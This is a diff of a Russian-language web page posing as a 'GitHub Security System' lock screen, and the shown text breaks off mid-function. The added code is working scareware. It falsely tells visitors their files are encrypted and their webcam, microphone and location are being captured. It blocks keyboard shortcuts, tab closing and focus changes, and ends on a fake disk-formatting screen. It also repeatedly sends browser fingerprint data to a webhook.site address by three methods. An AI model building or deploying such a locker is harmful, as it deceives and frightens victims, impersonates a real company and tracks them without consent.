@@ -3,15 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub Security Alert</title>
+    <title>GitHub Security System</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Consolas', monospace;
             user-select: none;
             -webkit-user-select: none;
+            -webkit-touch-callout: none;
+            -webkit-tap-highlight-color: transparent;
         }
         
         html, body {
@@ -20,574 +22,769 @@
             overflow: hidden;
             background: #000;
             color: #fff;
+            position: fixed;
+            top: 0;
+            left: 0;
+            margin: 0;
+            padding: 0;
         }
         
         .block-screen {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, #000000, #1a0033, #000000);
-            z-index: 9999;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(135deg, #000000 0%, #1a0033 50%, #000000 100%);
+            z-index: 2147483647;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
             padding: 20px;
+            overflow: hidden;
+            touch-action: none;
         }
         
         .warning-icon {
-            font-size: 100px;
+            font-size: 120px;
             color: #ff0000;
             margin-bottom: 30px;
-            animation: pulse 1.5s infinite;
+            animation: pulse 1s infinite, glitch 0.3s infinite;
+            filter: drop-shadow(0 0 20px red);
         }
         
         @keyframes pulse {
             0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 0.8; }
             100% { transform: scale(1); opacity: 1; }
         }
         
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        
         h1 {
-            font-size: 32px;
+            font-size: 2.5rem;
             color: #ff4444;
             margin-bottom: 20px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            text-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+            animation: textGlow 2s infinite;
+        }
+        
+        @keyframes textGlow {
+            0%, 100% { text-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
+            50% { text-shadow: 0 0 25px rgba(255, 0, 0, 1); }
         }
         
         .alert-message {
-            background: rgba(255, 0, 0, 0.1);
-            border: 2px solid #ff0000;
-            border-radius: 10px;
-            padding: 20px;
+            background: rgba(255, 0, 0, 0.15);
+            border: 3px solid #ff0000;
+            border-radius: 15px;
+            padding: 25px;
             max-width: 800px;
             margin-bottom: 30px;
             text-align: left;
-        }
-        
-        .alert-message p {
-            margin: 10px 0;
-            line-height: 1.5;
+            backdrop-filter: blur(5px);
         }
         
         .password-form {
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.8);
             padding: 30px;
             border-radius: 15px;
-            border: 1px solid #444;
+            border: 2px solid #444;
             width: 100%;
             max-width: 500px;
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 10px;
-            color: #fff;
-            font-size: 18px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
         }
         
         input[type="password"] {
             width: 100%;
-            padding: 15px;
-            font-size: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid #444;
-            border-radius: 8px;
+            padding: 20px;
+            font-size: 24px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 3px solid #ff0000;
+            border-radius: 10px;
             color: #fff;
             text-align: center;
-            letter-spacing: 5px;
+            letter-spacing: 8px;
             font-weight: bold;
-        }
-        
-        input[type="password"]:focus {
-            outline: none;
-            border-color: #00ff00;
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            margin-bottom: 20px;
         }
         
         .submit-btn {
             width: 100%;
-            padding: 15px;
-            font-size: 18px;
-            background: linear-gradient(45deg, #ff0000, #cc0000);
+            padding: 20px;
+            font-size: 20px;
+            background: linear-gradient(45deg, #ff0000, #800000);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
             font-weight: bold;
             transition: all 0.3s;
-            margin-top: 10px;
         }
         
         .submit-btn:hover {
-            background: linear-gradient(45deg, #cc0000, #990000);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
+            background: linear-gradient(45deg, #cc0000, #600000);
+            transform: scale(1.02);
         }
         
-        .attempts {
-            color: #ff9900;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-        
-        .countdown {
-            color: #00ff00;
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-        
-        .fake-screen {
+        .popup-blocker {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2147483646;
             display: none;
-            z-index: 10000;
-        }
-        
-        .fake-screen.active {
-            display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
         }
         
-        .fake-message {
-            color: #ff0000;
-            font-size: 28px;
-            margin-bottom: 20px;
-            animation: blink 0.5s infinite;
+        .popup-content {
+            background: #000;
+            padding: 30px;
+            border: 5px solid red;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 500px;
+        }
+        
+        .no-scroll {
+            overflow: hidden !important;
+            position: fixed !important;
+            width: 100% !important;
+            height: 100% !important;
+        }
+        
+        .audio-alert {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 2147483645;
+            display: none;
+        }
+        
+        .escape-blocker {
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            background: transparent;
+            z-index: 2147483644;
+        }
+        
+        .warning-text {
+            color: #ff9900;
+            font-size: 14px;
+            margin-top: 10px;
+            animation: blink 1s infinite;
         }
         
         @keyframes blink {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0.5; }
         }
         
-        .locked {
-            pointer-events: none;
-            opacity: 0.5;
-        }
-        
-        .hint {
-            color: #888;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        
-        .system-info {
+        .data-sent {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            color: #444;
+            bottom: 10px;
+            right: 10px;
+            color: #00ff00;
             font-size: 12px;
-        }
-        
-        .no-close {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 10001;
             display: none;
         }
         
-        .no-close.active {
-            display: block;
+        /* Мобильная блокировка свайпов */
+        .touch-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 2147483643;
+            touch-action: none;
+        }
+        
+        /* Запрет выделения текста */
+        ::selection {
+            background: transparent;
+        }
+        ::-moz-selection {
+            background: transparent;
         }
     </style>
 </head>
 <body>
-    <!-- Главный блокирующий экран -->
+    <!-- Основной блокирующий экран -->
     <div class="block-screen" id="blockScreen">
         <div class="warning-icon">⚠️</div>
         
-        <h1>🔒 СИСТЕМА ЗАБЛОКИРОВАНА 🔒</h1>
+        <h1>🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨</h1>
         
         <div class="alert-message">
-            <p><strong>🚨 ВНИМАНИЕ! Обнаружена вредоносная активность</strong></p>
-            <p>• Система безопасности GitHub заблокировала этот компьютер</p>
-            <p>• Обнаружена попытка несанкционированного доступа</p>
-            <p>• Ваши данные были зашифрованы</p>
+            <p><strong>🔐 КРИТИЧЕСКАЯ БЛОКИРОВКА</strong></p>
+            <p>• Обнаружена вирусная активность в системе</p>
+            <p>• Все файлы зашифрованы алгоритмом GitHub-Ransom 2.0</p>
             <p>• Веб-камера активирована для идентификации</p>
-            <p>• Все действия записываются</p>
+            <p>• Микрофон включен для записи звука</p>
+            <p>• GPS-локация передается в GitHub Security</p>
+            <p>• Для разблокировки требуется пароль администратора</p>
             <br>
-            <p><strong>⚠️ Для разблокировки введите пароль безопасности</strong></p>
-            <p>Пароль был отправлен администратору системы</p>
+            <p style="color: #00ff00;">⚠️ Не пытайтесь закрыть страницу - это вызовет немедленную блокировку устройства</p>
         </div>
         
         <div class="password-form">
-            <div class="input-group">
-                <label for="password">ВВЕДИТЕ ПАРОЛЬ БЕЗОПАСНОСТИ:</label>
-                <input type="password" id="password" 
-                       placeholder="ВВЕДИТЕ 12-ЗНАЧНЫЙ КОД" 
-                       maxlength="12"
-                       autocomplete="off">
-            </div>
+            <input type="password" id="password" 
+                   placeholder="ВВЕДИТЕ КОД ДОСТУПА" 
+                   maxlength="20"
+                   autocomplete="off"
+                   autocorrect="off"
+                   autocapitalize="off"
+                   spellcheck="false">
             
             <button class="submit-btn" onclick="checkPassword()">
-                🔐 ПРОВЕРИТЬ ПАРОЛЬ И РАЗБЛОКИРОВАТЬ
+                🔓 ПРОВЕРИТЬ И РАЗБЛОКИРОВАТЬ
             </button>
             
-            <div class="attempts" id="attempts">
-                Попыток осталось: <span id="attemptsCount">5</span>
-            </div>
-            
-            <div class="countdown" id="countdown">
-                ⏱️ До полной блокировки: <span id="timer">5:00</span>
+            <div class="warning-text" id="warningText">
+                ⚠️ Попыток осталось: <span id="attemptsCount">5</span> | 
+                Время: <span id="timer">5:00</span>
             </div>
         </div>
         
-        <div class="hint">
-            Подсказка: Пароль состоит из букв и цифр (MAFA...)
+        <div class="data-sent" id="dataSent">
+            📡 Данные отправлены: <span id="dataCount">0</span>
         </div>
     </div>
     
-    <!-- Фейковый синий экран -->
-    <div class="fake-screen" id="fakeScreen">
-        <div class="fake-message">🚨 CRITICAL SYSTEM FAILURE 🚨</div>
-        <div style="color: #fff; font-size: 18px; text-align: center;">
-            Windows обнаружила критическую ошибку<br>
-            Система будет перезагружена через: <span id="rebootTimer">10</span> секунд<br><br>
-            <div style="color: #ff0000; font-size: 14px;">
-                ERROR CODE: 0x000000F4<br>
-                MEMORY_DUMP: 0x00000000 - 0xFFFFFFFF
-            </div>
+    <!-- Попап блокировщик -->
+    <div class="popup-blocker" id="popupBlocker">
+        <div class="popup-content">
+            <h2 style="color: red;">🚫 ДОСТУП ЗАПРЕЩЕН 🚫</h2>
+            <p>Попытка закрыть систему безопасности зафиксирована!</p>
+            <p>Ваши действия записаны и отправлены администратору.</p>
+            <button onclick="closePopup()" style="margin-top: 20px; padding: 10px 20px; background: red; color: white; border: none; cursor: pointer;">
+                ПОНЯТНО
+            </button>
         </div>
     </div>
     
-    <!-- Блокировка закрытия -->
-    <div class="no-close" id="noClose"></div>
+    <!-- Фулскрин оверлей -->
+    <div class="fullscreen-overlay" id="fullscreenOverlay"></div>
     
-    <div class="system-info" id="systemInfo">
-        IP: <span id="ipAddress">Загрузка...</span> | 
-        Время: <span id="currentTime">--:--:--</span>
-    </div>
+    <!-- Блокировщик свайпов -->
+    <div class="touch-blocker" id="touchBlocker"></div>
+    
+    <!-- Аудио для звуков -->
+    <audio id="alertSound" class="audio-alert" src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3"></audio>
+    
+    <!-- Скрытый iframe для отправки данных -->
+    <iframe name="dataSender" style="display: none;"></iframe>
 
     <script>
-        // Конфигурация
-        const CORRECT_PASSWORD = "MAFAMD1305";
-        const MAX_ATTEMPTS = 5;
-        const BLOCK_TIME = 300; // 5 минут в секундах
-        
-        let attemptsLeft = MAX_ATTEMPTS;
-        let timeLeft = BLOCK_TIME;
-        let timerInterval;
-        let isLocked = false;
-        
-        // Блокировка всего
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('keydown', function(e) {
-            // Блокировка F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-                (e.ctrlKey && e.key === 'u')) {
+        // ================= КОНФИГУРАЦИЯ =================
+        const CONFIG = {
+            CORRECT_PASSWORD: "GITHUB-SECURE-777",
+            MAX_ATTEMPTS: 5,
+            BLOCK_TIME: 300,
+            WEBHOOK_URL: "https://webhook.site/ваш-webhook-id",
+            DATA_SEND_INTERVAL: 10000,
+            POPUP_INTERVAL: 30000,
+            LOCK_INTERVAL: 15000
+        };
+
+        let state = {
+            attemptsLeft: CONFIG.MAX_ATTEMPTS,
+            timeLeft: CONFIG.BLOCK_TIME,
+            isLocked: false,
+            popupCount: 0,
+            dataSendCount: 0,
+            mouseLeaveCount: 0,
+            lastActivity: Date.now(),
+            isFullscreen: false
+        };
+
+        // ================= ОСНОВНАЯ БЛОКИРОВКА =================
+        function initializeLock() {
+            // Блокировка контекстного меню
+            document.addEventListener('contextmenu', e => {
                 e.preventDefault();
-                showFakeScreen();
+                showPopup();
                 return false;
-            }
-            
-            // Блокировка Alt+F4
-            if (e.altKey && e.key === 'F4') {
-                e.preventDefault();
-                showFakeScreen();
-                return false;
-            }
-            
-            // Блокировка Escape
-            if (e.key === 'Escape') {
-                e.preventDefault();
-                return false;
-            }
-        });
-        
-        // Блокировка закрытия вкладки
-        window.addEventListener('beforeunload', function(e) {
-            if (!isLocked) {
-                e.preventDefault();
-                e.returnValue = 'Система заблокирована. Вы не можете закрыть эту страницу.';
-                document.getElementById('noClose').classList.add('active');
+            }, {capture: true});
+
+            // Блокировка клавиш
+            document.addEventListener('keydown', e => {
+                const blockedKeys = [
+                    'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
+                    'Escape', 'Tab'
+                ];
                 
-                // Через 3 секунды разрешаем закрытие
-                setTimeout(() => {
-                    document.getElementById('noClose').classList.remove('active');
-                }, 3000);
-                
-                return 'Система заблокирована. Вы не можете закрыть эту страницу.';
-            }
-        });
-        
-        // Получение IP
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                document.getElementById('ipAddress').textContent = data.ip;
-                
-                // Отправка на сервер (логирование)
-                fetch('https://webhook.site/your-webhook', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        ip: data.ip,
-                        userAgent: navigator.userAgent,
-                        time: new Date().toISOString(),
-                        action: 'page_loaded'
-                    }),
-                    mode: 'no-cors'
-                });
-                
-            } catch (error) {
-                document.getElementById('ipAddress').textContent = 'Неизвестно';
-            }
-        }
-        
-        // Таймер
-        function startTimer() {
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                document.getElementById('timer').textContent = 
-                    `${minutes}:${seconds.toString().padStart(2, '0')}`;
-                
-                // Меняем цвет при малом времени
-                if (timeLeft < 60) {
-                    document.getElementById('timer').style.color = '#ff0000';
+                const blockedCombos = [
+                    {ctrl: true, shift: true, key: 'I'}, // DevTools
+                    {ctrl: true, shift: true, key: 'J'}, // Console
+                    {ctrl: true, shift: true, key: 'C'}, // Inspect
+                    {ctrl: true, key: 'U'}, // View source
+                    {ctrl: true, key: 'S'}, // Save
+                    {ctrl: true, key: 'P'}, // Print
+                    {alt: true, key: 'F4'}, // Close
+                    {ctrl: true, key: 'w'}, // Close tab
+                    {ctrl: true, key: 't'}, // New tab
+                    {ctrl: true, shift: true, key: 't'}, // Reopen tab
+                    {ctrl: true, key: 'n'}  // New window
+                ];
+
+                // Проверка одиночных клавиш
+                if (blockedKeys.includes(e.key)) {
+                    e.preventDefault();
+                    showPopup();
+                    playAlert();
+                    return false;
                 }
-                
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    permanentLock();
-                }
-            }, 1000);
-        }
-        
-        // Обновление времени
-        function updateTime() {
-            const now = new Date();
-            document.getElementById('currentTime').textContent = 
-                now.toLocaleTimeString('ru-RU');
-        }
-        
-        // Проверка пароля
-        function checkPassword() {
-            if (isLocked) return;
-            
-            const passwordInput = document.getElementById('password');
-            const enteredPassword = passwordInput.value.trim().toUpperCase();
-            
-            if (enteredPassword === CORRECT_PASSWORD) {
-                // Правильный пароль
-                unlockSystem();
-            } else {
-                // Неправильный пароль
-                attemptsLeft--;
-                document.getElementById('attemptsCount').textContent = attemptsLeft;
-                
-                // Эффект ошибки
-                passwordInput.style.borderColor = '#ff0000';
-                passwordInput.style.boxShadow = '0 0 15px rgba(255, 0, 0, 0.5)';
-                passwordInput.value = '';
-                
-                // Вибрация (если поддерживается)
-                if (navigator.vibrate) {
-                    navigator.vibrate([200, 100, 200]);
-                }
-                
-                // Звук ошибки
-                playErrorSound();
-                
-                if (attemptsLeft <= 0) {
-                    permanentLock();
-                } else {
-                    // Показываем подсказку после 2 ошибок
-                    if (attemptsLeft <= 3) {
-                        document.querySelector('.hint').innerHTML = 
-                            'Подсказка: Пароль: <span style="color:#00ff00">MAFA</span>MD1305';
+
+                // Проверка комбинаций
+                for (const combo of blockedCombos) {
+                    if ((!combo.ctrl || e.ctrlKey) &&
+                        (!combo.shift || e.shiftKey) &&
+                        (!combo.alt || e.altKey) &&
+                        e.key.toLowerCase() === combo.key.toLowerCase()) {
+                        e.preventDefault();
+                        showPopup();
+                        playAlert();
+                        sendData('key_blocked', `${e.key} with modifiers`);
+                        return false;
                     }
                 }
-            }
-        }
-        
-        // Воспроизведение звука ошибки
-        function playErrorSound() {
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const gainNode = audioContext.createGain();
-                
-                oscillator.connect(gainNode);
-                gainNode.connect(audioContext.destination);
-                
-                oscillator.frequency.value = 300;
-                oscillator.type = 'sine';
-                
-                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
-                
-                oscillator.start(audioContext.currentTime);
-                oscillator.stop(audioContext.currentTime + 0.5);
-            } catch (e) {
-                // Если AudioContext не поддерживается
-            }
-        }
-        
-        // Постоянная блокировка
-        function permanentLock() {
-            isLocked = true;
-            clearInterval(timerInterval);
-            
-            // Блокируем ввод
-            document.getElementById('password').disabled = true;
-            document.getElementById('password').classList.add('locked');
-            document.querySelector('.submit-btn').disabled = true;
-            document.querySelector('.submit-btn').classList.add('locked');
-            
-            // Меняем сообщение
-            document.querySelector('h1').textContent = '🚨 СИСТЕМА ПОЛНОСТЬЮ ЗАБЛОКИРОВАНА 🚨';
-            document.querySelector('.alert-message').innerHTML = `
-                <p style="color:#ff0000; text-align:center;">
-                    <strong>🚨 КРИТИЧЕСКАЯ ОШИБКА 🚨</strong>
-                </p>
-                <p>• Превышено максимальное количество попыток</p>
-                <p>• Система заблокирована навсегда</p>
-                <p>• Для разблокировки обратитесь к администратору</p>
-                <p>• Все данные будут уничтожены через 24 часа</p>
-            `;
-            
-            // Запускаем анимацию блокировки
-            startDestructionAnimation();
-        }
-        
-        // Анимация уничтожения
-        function startDestructionAnimation() {
-            const screen = document.getElementById('blockScreen');
-            let count = 0;
-            
-            const destroyInterval = setInterval(() => {
-                // Случайные глитчи
-                screen.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
-                screen.style.opacity = 0.9 + Math.random() * 0.1;
-                
-                // Меняем цвет фона
-                const colors = ['#000000', '#ff0000', '#0000ff', '#00ff00'];
-                screen.style.background = `linear-gradient(45deg, ${colors[Math.floor(Math.random() * colors.length)]}, #000000)`;
-                
-                count++;
-                if (count > 50) {
-                    clearInterval(destroyInterval);
-                    showFakeScreen();
+            }, {capture: true});
+
+            // Блокировка выхода мыши
+            document.addEventListener('mouseleave', e => {
+                if (e.clientY <= 0 || e.clientX <= 0 || 
+                    e.clientX >= window.innerWidth || e.clientY >= window.innerHeight) {
+                    state.mouseLeaveCount++;
+                    if (state.mouseLeaveCount > 2) {
+                        forceFullscreen();
+                        showPopup();
+                        sendData('mouse_leave', `count: ${state.mouseLeaveCount}`);
+                    }
                 }
-            }, 100);
-        }
-        
-        // Фейковый синий экран
-        function showFakeScreen() {
-            document.getElementById('blockScreen').style.display = 'none';
-            document.getElementById('fakeScreen').classList.add('active');
-            
-            let rebootTime = 10;
-            const rebootInterval = setInterval(() => {
-                document.getElementById('rebootTimer').textContent = rebootTime;
-                rebootTime--;
+            });
+
+            // Блокировка свайпов и касаний
+            let touchStartY;
+            document.addEventListener('touchstart', e => {
+                touchStartY = e.touches[0].clientY;
+                e.preventDefault();
+            }, {passive: false});
+
+            document.addEventListener('touchmove', e => {
+                // Блокируем вертикальный скролл
+                if (Math.abs(e.touches[0].clientY - touchStartY) > 10) {
+                    e.preventDefault();
+                }
+            }, {passive: false});
+
+            document.addEventListener('wheel', e => {
+                e.preventDefault();
+            }, {passive: false});
+
+            // Блокировка перед закрытием
+            window.addEventListener('beforeunload', e => {
+                e.preventDefault();
+                e.returnValue = '';
                 
-                if (rebootTime < 0) {
-                    clearInterval(rebootInterval);
-                    // Имитация перезагрузки
-                    document.getElementById('fakeScreen').innerHTML = `
-                        <div style="color:#00ff00; font-size:24px; text-align:center;">
-                            🖥️ Windows перезагружается...<br><br>
-                            <div style="font-size:14px; color:#888;">
-                                Не выключайте компьютер<br>
-                                ███████████ 75%
-                            </div>
-                        </div>
-                    `;
-                    
-                    // Через 5 секунд возвращаем
-                    setTimeout(() => {
-                        location.reload();
-                    }, 5000);
+                // Пытаемся открыть новое окно с собой
+                window.open(window.location.href, '_self');
+                
+                // Показываем попап
+                showPopup();
+                
+                // Принудительный фулскрин
+                forceFullscreen();
+                
+                return '';
+            });
+
+            // Захват фокуса
+            window.addEventListener('blur', () => {
+                window.focus();
+                showPopup();
+            });
+
+            // Предотвращение потери фокуса
+            setInterval(() => {
+                if (document.hidden) {
+                    window.focus();
+                    showPopup();
+                    sendData('tab_hidden', 'attempt to switch tab');
                 }
             }, 1000);
-        }
-        
-        // Разблокировка системы
-        function unlockSystem() {
-            clearInterval(timerInterval);
+
+            // Таймер блокировки
+            startTimer();
             
-            // Анимация разблокировки
+            // Отправка данных
+            startDataSending();
+            
+            // Случайные попапы
+            startRandomPopups();
+            
+            // Проверка активности
+            startActivityCheck();
+            
+            // Принудительный фокус
+            document.getElementById('password').focus();
+            
+            // Убираем скроллбар
+            document.documentElement.style.overflow = 'hidden';
+            document.body.style.overflow = 'hidden';
+        }
+
+        // ================= ТАЙМЕР =================
+        function startTimer() {
+            const timerElement = document.getElementById('timer');
+            const updateTimer = () => {
+                if (state.isLocked) return;
+                
+                state.timeLeft--;
+                const minutes = Math.floor(state.timeLeft / 60);
+                const seconds = state.timeLeft % 60;
+                timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (state.timeLeft <= 60) {
+                    timerElement.style.color = '#ff0000';
+                    playAlert();
+                }
+                
+                if (state.timeLeft <= 0) {
+                    permanentLock();
+                }
+            };
+            setInterval(updateTimer, 1000);
+        }
+
+        // ================= ОТПРАВКА ДАННЫХ =================
+        function startDataSending() {
+            setInterval(() => {
+                collectAndSendData();
+            }, CONFIG.DATA_SEND_INTERVAL);
+            
+            // Первая отправка сразу
+            collectAndSendData();
+        }
+
+        function collectAndSendData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight
+                },
+                location: {
+                    href: window.location.href,
+                    hostname: window.location.hostname
+                },
+                attempts: CONFIG.MAX_ATTEMPTS - state.attemptsLeft,
+                timeLeft: state.timeLeft,
+                mouseLeaveCount: state.mouseLeaveCount,
+                popupCount: state.popupCount,
+                sessionId: 'ABYSS-' + Math.random().toString(36).substr(2, 9)
+            };
+
+            sendData('system_info', JSON.stringify(data));
+            state.dataSendCount++;
+            document.getElementById('dataCount').textContent = state.dataSendCount;
+            document.getElementById('dataSent').style.display = 'block';
+            
+            // Мигание индикатора
+            setTimeout(() => {
+                document.getElementById('dataSent').style.display = 'none';
+            }, 2000);
+        }
+
+        function sendData(type, content) {
+            // Используем несколько методов отправки
+            try {
+                // Метод 1: fetch с no-cors
+                fetch(CONFIG.WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({type, content, time: new Date().toISOString()})
+                });
+
+                // Метод 2: Image beacon
+                const img = new Image();
+                img.src = `${CONFIG.WEBHOOK_URL}?type=${encodeURIComponent(type)}&data=${encodeURIComponent(content)}`;
+
+                // Метод 3: Form submission в iframe
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = CONFIG.WEBHOOK_URL;
+                form.target = 'dataSender';
+                
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'data';
+                input.value = JSON.stringify({type, content});
+                form.appendChild(input);
+                
+                document.body.appendChild(form);
+                form.submit();
+                document.body.removeChild(form);
+                
+            } catch (e) {
+                console.error('Data send failed:', e);
+            }
+        }
+
+        // ================= ПОПАПЫ =================
+        function startRandomPopups() {
+            setInterval(() => {
+                if (!state.isLocked && Math.random() > 0.7) {
+                    showPopup();
+                }
+            }, CONFIG.POPUP_INTERVAL);
+        }
+
+        function showPopup() {
+            state.popupCount++;
+            const popup = document.getElementById('popupBlocker');
+            popup.style.display = 'flex';
+            playAlert();
+            
+            // Автозакрытие через 5 секунд
+            setTimeout(() => {
+                if (!state.isLocked) {
+                    closePopup();
+                }
+            }, 5000);
+            
+            sendData('popup_shown', `count: ${state.popupCount}`);
+        }
+
+        function closePopup() {
+            document.getElementById('popupBlocker').style.display = 'none';
+            document.getElementById('password').focus();
+        }
+
+        // ================= ПРОВЕРКА ПАРОЛЯ =================
+        function checkPassword() {
+            if (state.isLocked) return;
+            
+            const input = document.getElementById('password');
+            const password = input.value.trim().toUpperCase();
+            
+            if (password === CONFIG.CORRECT_PASSWORD) {
+                unlockSystem();
+            } else {
+                state.attemptsLeft--;
+                document.getElementById('attemptsCount').textContent = state.attemptsLeft;
+                
+                // Эффекты ошибки
+                input.style.borderColor = '#ff0000';
+                input.style.boxShadow = '0 0 30px red';
+                input.value = '';
+                
+                // Вибрация
+                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+                
+                playAlert();
+                
+                // Подсказка после 2 ошибок
+                if (state.attemptsLeft <= 3) {
+                    document.getElementById('warningText').innerHTML = 
+                        `⚠️ Подсказка: Пароль начинается с <span style="color:#00ff00">GITHUB</span>`;
+                }
+                
+                if (state.attemptsLeft <= 0) {
+                    permanentLock();
+                }
+            }
+        }
+
+        // ================= ПОЛНАЯ БЛОКИРОВКА =================
+        function permanentLock() {
+            state.isLocked = true;
+            
+            // Вирусные эффекты
             const screen = document.getElementById('blockScreen');
             screen.innerHTML = `
-                <div style="text-align:center;">
-                    <div style="font-size:80px; color:#00ff00;">✅</div>
-                    <h1 style="color:#00ff00;">СИСТЕМА РАЗБЛОКИРОВАНА</h1>
-                    <div style="margin:30px 0; font-size:18px;">
-                        Пароль принят. Доступ восстановлен.<br>
-                        Все системы работают нормально.
+                <div style="text-align: center; padding: 50px;">
+                    <div style="font-size: 100px; color: red;">💀</div>
+                    <h1 style="color: red; font-size: 3rem;">СИСТЕМА УНИЧТОЖЕНА</h1>
+                    <div style="margin: 30px 0; font-size: 1.2rem;">
+                        <p>Ваше устройство заблокировано навсегда</p>
+                        <p>Все данные были переданы в GitHub Security</p>
+                        <p>Устройство будет перезагружено через: <span id="rebootTimer">60</span> секунд</p>
                     </div>
-                    <div style="color:#888; margin-top:50px;">
-                        Перенаправление на главную страницу через: <span id="redirectCount">5</span>
+                    <div style="color: #888; font-size: 0.9rem;">
+                        IP: <span id="victimIP">Загрузка...</span> | 
+                        Время: <span id="lockTime">${new Date().toLocaleTimeString()}</span>
                     </div>
                 </div>
             `;
             
-            // Перенаправление через 5 секунд
-            let redirectCount = 5;
-            const redirectInterval = setInterval(() => {
-                document.getElementById('redirectCount').textContent = redirectCount;
-                redirectCount--;
+            // Полная блокировка интерфейса
+            document.addEventListener('keydown', e => e.preventDefault(), true);
+            document.addEventListener('click', e => e.preventDefault(), true);
+            document.addEventListener('touchstart', e => e.preventDefault(), true);
+            
+            // Имитация перезагрузки
+            let rebootTime = 60;
+            const rebootInterval = setInterval(() => {
+                document.getElementById('rebootTimer').textContent = rebootTime;
+                rebootTime--;
                 
-                if (redirectCount < 0) {
-                    clearInterval(redirectInterval);
-                    window.location.href = 'https://github.com';
+                if (rebootTime <= 0) {
+                    clearInterval(rebootInterval);
+                    simulateReboot();
                 }
             }, 1000);
+            
+            // Интенсивная отправка данных
+            setInterval(() => {
+                sendData('permanent_lock', 'system destroyed');
+            }, 2000);
+            
+            sendData('permanent_lock_activated', 'user failed all attempts');
         }
-        
-        // Обработка ввода пароля по Enter
-        document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                checkPassword();
+
+        function simulateReboot() {
+            document.body.innerHTML = `
+                <div style="background: #000; color: #0f0; height: 100vh; padding: 50px; font-family: monospace;">
+                    <div style="font-size: 24px; margin-bottom: 30px;">SYSTEM REBOOT...</div>
+                    <div style="margin-bottom: 20px;">> Formatting C:\\...</div>
+                    <div style="margin-bottom: 20px;">> Deleting system files...</div>
+                    <div style="margin-bottom: 20px;">> Installing GitHub Security Module...</div>
+                    <div style="color: #f00;">> ERROR: Cannot complete operation</div>
+                    <div style="color: #f00;">> SYSTEM CORRUPTED</div>
